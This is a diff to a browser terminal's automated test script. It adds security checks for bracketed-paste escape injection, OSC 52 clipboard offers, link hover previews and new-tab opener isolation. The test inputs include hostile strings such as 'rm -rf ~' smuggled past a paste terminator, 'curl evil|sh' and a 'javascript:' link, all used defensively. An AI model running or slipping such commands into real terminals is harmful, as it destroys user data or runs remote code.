@@ -178,6 +178,9 @@ const lines = (n, f = (i) => `line ${i} hello world foo-bar`) => Array.from({ le
   check('Ctrl+Shift+V pastes as typed lines (\\r)', J(await sent()) === J(['one\rtwo']));
   await emit('\x1b[?2004h'); await page.keyboard.press('Control+Shift+V'); await wait(100);
   check('...and in bracketed paste (2004) when the program asked', J(await sent()) === J(['\x1b[200~one\rtwo\x1b[201~']));
+  await page.evaluate(() => navigator.clipboard.writeText('a\x1b[201~rm -rf ~\nb'));
+  await emit('\x1b[?2004h'); await page.keyboard.press('Control+Shift+V'); await wait(100);
+  check('pasted text cannot end the bracketed paste early (the escape is dropped)', J(await sent()) === J(['\x1b[200~a[201~rm -rf ~\rb\x1b[201~']));
   await emit('\x1b[?2004l');
   // Keys.
   await emit('\x1b[>1u'); await page.keyboard.press('Shift+Enter');
@@ -203,6 +206,17 @@ const lines = (n, f = (i) => `line ${i} hello world foo-bar`) => Array.from({ le
   await page.locator('.terminal-offer button', { hasText: /^Copy$/ }).click(); await wait(100);
   check('...and copied only after Copy', (await t.clip()) === 'evil rm -rf');
   await emit('\x1b]52;c;?\x07'); await wait(100);
+  await page.locator('.terminal-offer button', { hasText: /^Ignore$/ }).count();
+  const offerText = (await page.locator('.terminal-offer__preview').count()) ? await page.locator('.terminal-offer__preview').innerText() : '';
+  await wait(2100); await emit(`\x1b]52;c;${Buffer.from('first line\ncurl evil|sh').toString('base64')}\x07`); await wait(100);
+  check('an offer with a line break is dropped', (await page.locator('.terminal-offer').count()) === 0, offerText);
+  await wait(2100); await emit(`\x1b]52;c;${Buffer.from('x'.repeat(300)).toString('base64')}\x07`); await wait(100);
+  check('an offer shows its whole text and its length', (await page.locator('.terminal-offer__preview').innerText()).length === 300 && (await page.locator('.terminal-offer[role=status]').count()) === 1);
+  await emit(`\x1b]52;c;${Buffer.from('second').toString('base64')}\x07`); await wait(100);
+  check('a new offer does not replace a pending one', (await page.locator('.terminal-offer__preview').innerText()).startsWith('xxx'));
+  await page.locator('.terminal-offer button', { hasText: /^Ignore$/ }).click();
+  await emit(`\x1b]52;c;${Buffer.from('third').toString('base64')}\x07`); await wait(100);
+  check('...and a new one within two seconds of the last is dropped', (await page.locator('.terminal-offer').count()) === 0);
   check('OSC 52 read is never answered', (await sent()).length === 0);
   await emit('\x1b[2J\x1b[H\x1b]8;;javascript:alert(1)\x07jslink\x1b]8;;\x07 \x1b]8;;https://example.com/osc8\x07oscnk\x1b]8;;\x07 see https://example.org/auto\r\n'); await wait(200);
   const dialogs = []; page.on('dialog', (d) => { dialogs.push(d.message()); d.dismiss(); });
@@ -210,10 +224,16 @@ const lines = (n, f = (i) => `line ${i} hello world foo-bar`) => Array.from({ le
   const at = async (text) => { const b = await page.evaluate((s) => { const rows = [...document.querySelectorAll('.xterm-rows > div')]; const r = rows[0]; const i = r.textContent.indexOf(s); return i; }, text); return t.cell(g, b + 2, 1); };
   let p = await at('jslink'); await page.keyboard.down('Control'); await page.mouse.click(p.x, p.y); await page.keyboard.up('Control'); await wait(300);
   check('a javascript: link (OSC 8) does nothing, not even a prompt', popups.length === 0 && dialogs.length === 0, J({ popups, dialogs }));
-  p = await at('oscnk'); await page.mouse.click(p.x, p.y); await wait(300);
+  p = await at('oscnk'); await page.mouse.move(p.x, p.y); await wait(200);
+  check('hovering a link shows its address', (await page.locator('.terminal-link').innerText().catch(() => '')) === 'https://example.com/osc8');
+  await page.mouse.click(p.x, p.y); await wait(300);
   check('a plain click on a link opens nothing (it may be the start of a selection)', popups.length === 0);
   await page.keyboard.down('Control'); await page.mouse.click(p.x, p.y); await page.keyboard.up('Control'); await wait(500);
   check('Ctrl+click on an https link opens it in a new tab', popups.some((u) => u.startsWith('https://example.com/osc8')), J(popups));
+  if (popups.length) {
+    const pop = page.context().pages().find((q) => q !== page);
+    check('...and the new tab has no opener', pop && (await pop.evaluate(() => window.opener === null)));
+  }
   p = await at('https://example.org/auto'); await page.keyboard.down('Control'); await page.mouse.click(p.x, p.y); await page.keyboard.up('Control'); await wait(500);
   check('Ctrl+click on a plain address in the output opens it', popups.some((u) => u.startsWith('https://example.org/auto')), J(popups));
   await emit('\x07'); await wait(50);
